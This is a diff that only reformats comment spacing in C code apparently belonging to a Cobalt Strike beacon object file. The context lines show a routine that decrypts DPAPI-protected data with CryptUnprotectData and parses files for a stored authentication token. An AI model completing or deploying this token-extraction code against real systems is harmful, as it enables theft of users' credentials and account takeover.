@@ -111,7 +111,7 @@ extern "C" {
 		inBlob.pbData = encryptedData;
 		inBlob.cbData = encryptedDataLen;
 
-		// Decrypt using current user's context
+		//Decrypt using current user's context
 		if (!CryptUnprotectData(&inBlob, NULL, NULL, NULL, NULL, 0, &outBlob)) {
 			;
 			BeaconPrintf(CALLBACK_ERROR, "CryptUnprotectData failed");
@@ -346,7 +346,7 @@ extern "C" {
 			char* utf8Buffer = utf16ToUTF8((wchar_t*)buffer);
 
 			//Get the b64 encoded + protected value holding the token
-			// Look for "ResponseBytes" first 
+			//Look for "ResponseBytes" first 
 			char* responsePtr = StrStrA(utf8Buffer, TARGET_PARENT);
 			if (!responsePtr) {
 				BeaconPrintf(CALLBACK_ERROR, "Parsing the file failed. Continuing with the next one.");
@@ -357,7 +357,7 @@ extern "C" {
 				continue;
 			}
 
-			// Look for nested "Value"
+			//Look for nested "Value"
 			char* result = findValue(responsePtr, TARGET_KEY);
 			if (!result) {
 				BeaconPrintf(CALLBACK_ERROR, "Parsing the file failed.Continuing with the next one.");
